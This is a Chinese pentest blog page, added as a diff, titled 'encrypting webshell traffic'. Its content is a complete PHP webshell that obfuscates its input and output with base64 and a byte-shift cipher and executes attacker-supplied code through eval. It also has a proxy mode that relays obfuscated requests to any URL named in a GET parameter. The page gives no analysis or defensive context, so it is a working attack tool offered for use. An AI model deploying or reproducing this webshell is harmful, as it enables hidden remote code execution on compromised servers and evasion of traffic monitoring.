@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>加密webshell流量</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/webshell-encrypt.html" rel="bookmark"
+           title="Permalink to 加密webshell流量">加密webshell流量</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-01-04T00:00:00+01:00">
+                <a href='#'>01/04/2017 </a>
+                <a href="/category/tools.html">Tools</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>http://www.hackshell.net/blog/index.php/archives/587/</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">function</span> <span class="nv">easy_en</span><span class="ss">(</span>$<span class="nv">str</span><span class="ss">)</span> {
+    $<span class="nv">ret</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="c1">;</span>
+    <span class="k">for</span> <span class="ss">(</span>$<span class="nv">i</span><span class="o">=</span><span class="mi">0</span><span class="c1">;$i&lt;strlen($str);$i++){</span>
+        $<span class="nv">old</span> <span class="o">=</span> <span class="nv">ord</span><span class="ss">(</span>$<span class="nv">str</span>[$<span class="nv">i</span>]<span class="ss">)</span><span class="c1">;</span>
+        <span class="k">if</span> <span class="ss">(</span>$<span class="nv">old</span> <span class="o">==</span> <span class="mi">0</span><span class="ss">)</span> $<span class="nv">new</span> <span class="o">=</span> <span class="mi">0</span><span class="nv">x7f</span><span class="c1">;</span>
+        <span class="k">else</span> $<span class="nv">new</span> <span class="o">=</span> $<span class="nv">old</span> <span class="o">-</span><span class="mi">1</span><span class="c1">;</span>
+        $<span class="nv">ret</span> .<span class="o">=</span> <span class="nv">chr</span><span class="ss">(</span>$<span class="nv">new</span><span class="ss">)</span><span class="c1">;</span>
+    }
+    <span class="k">return</span> $<span class="nv">ret</span><span class="c1">;</span>
+}
+
+<span class="nv">function</span> <span class="nv">easy_de</span><span class="ss">(</span>$<span class="nv">str</span><span class="ss">)</span> {
+    $<span class="nv">ret</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="c1">;</span>
+    <span class="k">for</span> <span class="ss">(</span>$<span class="nv">i</span><span class="o">=</span><span class="mi">0</span><span class="c1">;$i&lt;strlen($str);$i++){</span>
+        $<span class="nv">old</span> <span class="o">=</span> <span class="nv">ord</span><span class="ss">(</span>$<span class="nv">str</span>[$<span class="nv">i</span>]<span class="ss">)</span><span class="c1">;</span>
+        <span class="k">if</span> <span class="ss">(</span>$<span class="nv">old</span> <span class="o">==</span> <span class="mi">0</span><span class="nv">x7f</span><span class="ss">)</span> $<span class="nv">new</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">;</span>
+        <span class="k">else</span> $<span class="nv">new</span> <span class="o">=</span> $<span class="nv">old</span> <span class="o">+</span> <span class="mi">1</span><span class="c1">;</span>
+        $<span class="nv">ret</span> .<span class="o">=</span> <span class="nv">chr</span><span class="ss">(</span>$<span class="nv">new</span><span class="ss">)</span><span class="c1">;</span>
+    }
+    <span class="k">return</span> $<span class="nv">ret</span><span class="c1">;</span>
+}
+
+<span class="k">if</span> <span class="ss">(</span>@$<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">role</span><span class="s1">&#39;</span>] <span class="o">==</span> <span class="s1">&#39;</span><span class="s">proxy</span><span class="s1">&#39;</span> <span class="o">&amp;&amp;</span> @$<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">url</span><span class="s1">&#39;</span>]<span class="ss">)</span> {
+    <span class="mh">$c</span> <span class="o">=</span> <span class="nv">base64_encode</span><span class="ss">(</span><span class="nv">easy_en</span><span class="ss">(</span><span class="nv">file_get_contents</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">php://input</span><span class="s1">&#39;</span><span class="ss">)))</span><span class="c1">;</span>
+<span class="o">//</span>    <span class="nv">var_dump</span><span class="ss">(</span><span class="mh">$c</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="mh">$c</span><span class="nv">xt</span> <span class="o">=</span> <span class="nv">stream_context_create</span><span class="ss">(</span><span class="nv">array</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">http</span><span class="s1">&#39;</span><span class="o">=&gt;</span><span class="nv">array</span><span class="ss">(</span>
+        <span class="s1">&#39;</span><span class="s">header</span><span class="s1">&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;</span><span class="s">Content-Type: application/x-www-form-urlencoded</span><span class="s1">&#39;</span>,
+        <span class="s1">&#39;</span><span class="s">method</span><span class="s1">&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;</span><span class="s">POST</span><span class="s1">&#39;</span>,
+        <span class="s1">&#39;</span><span class="s">content</span><span class="s1">&#39;</span><span class="o">=&gt;</span><span class="mh">$c</span><span class="ss">)</span>,
+    <span class="ss">))</span><span class="c1">;</span>
+    <span class="mh">$c</span> <span class="o">=</span> <span class="nv">file_get_contents</span><span class="ss">(</span>$<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">url</span><span class="s1">&#39;</span>], <span class="nv">false</span>, <span class="mh">$c</span><span class="nv">xt</span><span class="ss">)</span><span class="c1">;</span>
+<span class="o">//</span>    <span class="nv">var_dump</span><span class="ss">(</span><span class="mh">$c</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">die</span><span class="ss">(</span><span class="nv">easy_de</span><span class="ss">(</span><span class="nv">base64_decode</span><span class="ss">(</span><span class="mh">$c</span><span class="ss">)))</span><span class="c1">;</span>
+}
+
+<span class="nv">function</span> <span class="nv">shutdown</span><span class="ss">()</span> {
+    $<span class="nv">str</span> <span class="o">=</span> <span class="nv">ob_get_contents</span><span class="ss">()</span><span class="c1">;</span>
+    <span class="nv">ob_end_clean</span><span class="ss">()</span><span class="c1">;</span>
+    <span class="nv">echo</span> <span class="nv">base64_encode</span><span class="ss">(</span><span class="nv">easy_en</span><span class="ss">(</span>$<span class="nv">str</span><span class="ss">))</span><span class="c1">;</span>
+}
+
+<span class="nv">register_shutdown_function</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">shutdown</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">ob_start</span><span class="ss">()</span><span class="c1">;</span>
+<span class="mh">$c</span> <span class="o">=</span> <span class="nv">easy_de</span><span class="ss">(</span><span class="nv">base64_decode</span><span class="ss">(</span><span class="nv">file_get_contents</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">php://input</span><span class="s1">&#39;</span><span class="ss">)))</span><span class="c1">;</span>
+<span class="nv">parse_str</span><span class="ss">(</span><span class="mh">$c</span>, $<span class="nv">_POST</span><span class="ss">)</span><span class="c1">; //解密之后把pass赋值给$_POST参数</span>
+<span class="nv">eval</span><span class="ss">(</span>$<span class="nv">_POST</span>[<span class="s1">&#39;</span><span class="s">pass</span><span class="s1">&#39;</span>]<span class="ss">)</span><span class="c1">;  //执行一句话</span>
+?<span class="o">&gt;</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
